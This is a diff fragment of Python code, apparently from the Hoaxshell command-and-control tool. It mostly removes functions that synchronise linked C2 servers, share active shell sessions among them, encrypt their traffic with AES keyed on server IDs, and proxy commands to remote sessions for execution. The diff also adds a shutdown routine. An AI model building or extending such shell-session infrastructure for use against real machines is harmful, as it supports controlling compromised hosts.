-	@staticmethod
-	def announce_server_shutdown():
-		
-		siblings = Core_server.sibling_servers.keys()
-		
-		if len(siblings):
-			
-			for sibling_id in siblings:
-				Core_server.send_receive_one_encrypted(sibling_id, {'sibling_id' : Core_server.SERVER_UNIQUE_ID}, 'server_shutdown')
-				
-				
-				
-	def update_siblings_data_table(self, siblings_data):
-		
-		current_siblings = self.sibling_servers.keys()
-		
-		for sibling_id in siblings_data.keys():
-			if sibling_id not in current_siblings and sibling_id != self.SERVER_UNIQUE_ID:
-				self.sibling_servers[sibling_id] = siblings_data[sibling_id]
-		
-
-
-	def update_shell_sessions(self, shells_data):
-
-		current_shells = Sessions_manager.active_sessions.keys()
-		
-		for session_id in shells_data.keys():
-			if session_id not in current_shells:
-				shells_data[session_id]['alias'] = None
-				shells_data[session_id]['aliased'] = False
-				shells_data[session_id]['self_owned'] = False
-				Sessions_manager.active_sessions[session_id] = shells_data[session_id]
-						
-
-
-	def server_is_sibling(self, server_ip, server_port = False):
-		
-		sibling_id = None
-		siblings = clone_dict_keys(self.sibling_servers)	
-		
-		for sibling in siblings:
-			
-			if server_port:
-				if self.sibling_servers[sibling]['Server IP'] == server_ip and \
-				self.sibling_servers[sibling]['Server Port'] == int(server_port):
-					sibling_id = sibling
-					break
-					
 			else:
-				if self.sibling_servers[sibling]['Server IP'] == server_ip:
-					sibling_id = sibling
-					break				
-		
-		return sibling_id
-
-
-
-	@staticmethod
-	def send_receive_one_encrypted(sibling_id, data_dict, capsule, timeout = 10):
-		
-		# AES KEY is the server's ID and IV is the 16 first bytes of the sibling's ID
-		server_unique_id = Core_server.return_server_uniq_id()
-		encapsulated_data = str(Core_server.encapsulate_dict(data_dict, capsule))
-		
-		encapsulated_data_encrypted = encrypt_msg(server_unique_id.encode('utf-8'), encapsulated_data, \
-		sibling_id[0:16].encode('utf-8'))
-		
-		encapsulated_response_data_encrypted = Core_server.send_receive_one(encapsulated_data_encrypted, \
-		Core_server.sibling_servers[sibling_id]['Server IP'], Core_server.sibling_servers[sibling_id]['Server Port'], \
-		
-		encode_msg = False, timeout = timeout)
-		
-		if encapsulated_response_data_encrypted not in ['connection_refused', 'timed_out']:
-			
-			encapsulated_response_data_decrypted = decrypt_msg(sibling_id.encode('utf-8'), \
-			encapsulated_response_data_encrypted, server_unique_id[0:16].encode('utf-8'))
-			
-			decapsulated_response_data = Core_server.decapsulate_dict(encapsulated_response_data_decrypted) # returns [capsule, received_data]
-			return decapsulated_response_data
-		
-		else:
-			return encapsulated_response_data_encrypted
-		
-		
-
-	def synchronize_sibling_servers(self):
-		
-		print('\rSynchronizing servers...')
-		sibling_servers = clone_dict_keys(self.sibling_servers)	
-		
-		for sibling_id in sibling_servers:
-			
-			remote_siblings_data = Core_server.send_receive_one_encrypted(sibling_id, \
-			self.sibling_servers, 'synchronize_sibling_servers_table')
-			
-			if isinstance(remote_siblings_data, dict):
-				self.update_siblings_data_table(remote_siblings_data[1])
-			
-			# Sync sibling servers shell sessions
-			remote_shells = Core_server.send_receive_one_encrypted(sibling_id, \
-			Sessions_manager.active_sessions, 'synchronize_sibling_servers_shells')
-			
-			self.update_shell_sessions(remote_shells[1])			
-
-			if not self.ping_sibling_servers:
-				siblings_status_monitor = Thread(target = self.ping_siblings, args = ())
-				siblings_status_monitor.daemon = True
-				siblings_status_monitor.start()	
-			
-		print('\rSynchronized!')
-		Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
-
-
-
-	def connect_with_sibling_server(self, server_ip, server_port):
-						
-		# Check if valid port
-		server_port = int(server_port)
-		authorized = True
-
-		if not is_valid_ip(server_ip):
-			print('\rProvided IP address is not valid.')
-			authorized = False				
-		
-		if server_port < 0 or server_port > 65535:
-			print('\rPort must be 0-65535.')
-			authorized = False					
-		
-		# Check if attempt to connect to self
-		if (server_port == Core_server_settings.bind_port) and (server_ip in ['127.0.0.1', 'localhost']):
-			print('\rIf you really want to connect with yourself, try yoga.')
-			authorized = False						
-		
-		# Check if server_ip already in siblings
-		server_is_sibling = self.server_is_sibling(server_ip, server_port)
-		
-		if server_is_sibling:
-			print('\rYou are already connected with this server.')
-			authorized = False			
-			
-			
-		# Init connect
-		if authorized:
-			print('Sending request to connect...')
-			response = self.send_receive_one(self.CONNECT_SYN, server_ip, server_port, encode_msg = False, timeout = 11)
-			
-			if response == 'connection_refused':
-				print(f'\r[{FAILED}] Connection refused.')
-				return
+				verified = True
 				
-			elif response == 'timed_out':
-				print(f'\r[{FAILED}] Connection timed out.')
-				return
-
-			elif response == self.CONNECT_ACK:
-				response = self.send_receive_one(f'{self.SERVER_UNIQUE_ID}:{Core_server_settings.bind_port}:{self.HOSTNAME}', server_ip, server_port, encode_msg = True)
-				tmp = response.decode('utf-8').split(':')
-				sibling_id = tmp[0]
-				sibling_hostname = tmp[1]
-
-				if is_valid_uuid(sibling_id):
-					self.sibling_servers[sibling_id] = {'Hostname': sibling_hostname, 'Server IP' : server_ip, 'Server Port' : server_port, 'Status' : 'Active'}
-						
-				else:
-					print(f'\r[{FAILED}] Connection request failed.')
-					return
-						
-				print('\rConnection established!\r')
+			
+			if verified:
 				
-				if not self.ping_sibling_servers:
-					siblings_status_monitor = Thread(target = self.ping_siblings, args = ())		
-					siblings_status_monitor.daemon = True
-					siblings_status_monitor.start()
-					
-			elif response == self.CONNECT_DENY:	
-				print(f'\r[{FAILED}] Request to connect denied.')
-
-		
-
-	@staticmethod	
-	def proxy_cmd_for_exec_by_sibling(sibling_id, session_id, command):
-		
-		# Check again if server in siblings
-		if sibling_id not in Core_server.sibling_servers.keys():
-			print('\rFailed to proxy the command. Connection with the sibling server may be lost.')
-			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
-			return
-		
-		# Send command to sibling
-		cmd_exec_data = {'session_id' : session_id, 'command' : command}
-		response = Core_server.send_receive_one_encrypted(sibling_id, cmd_exec_data, 'exec_command', Core_server_settings.timeout_for_command_output)
-		
-		# Read response
-		if response[0] == 'ACKNOWLEDGED':
-			print('Command delivered. Awaiting output...')
-		
-		
-
-	def ping_siblings(self):
-		
-		Threading_params.thread_limiter.acquire()
-		self.ping_sibling_servers = True
-		
-		while True:
-			
-			siblings = self.sibling_servers.keys()
-			
-			if not len(siblings):
-				Core_server.ping_siblings = False
-				Threading_params.thread_limiter.release()
-				break
-			
-			else:
-				
-				for sibling_id in siblings:
-					
-					try:				
-						response = Core_server.send_receive_one_encrypted(sibling_id, {0 : 0}, 'are_you_alive')
-						
-						self.sibling_servers[sibling_id]['Status'] = f'Unreachable' \
-						if response in ['connection_refused', 'timed_out'] else f'Active'
-					
-					except KeyError:
-						pass
-			
-			sleep(5)
+				print('\r')
+				Core_server.announce_server_shutdown()					
+				Hoaxshell.terminate()
+				core.stop_listener()
+				sys.exit(0)
 
 
 
-	def siblings_dict_to_list(self):
-		
-		siblings_list = []
-		corrupted = 0
-		
-		for sibling_id in self.sibling_servers.keys():
-			
-			try:
-				tmp = self.sibling_servers[sibling_id]
-				tmp['Sibling ID'] = sibling_id
-				siblings_list.append(tmp)
-				
-			except KeyError:
-				corrupted += 1
-			
-		if corrupted:
-			print(f'\r[{WARN}] {corrupted} x Corrupted sibling server data entries omitted.')
-			print(f'[{WARN}] Possible reason: Sibling server disconnected inelegantly.\n')
-				
-		return siblings_list
+if __name__ == '__main__':
+	main()
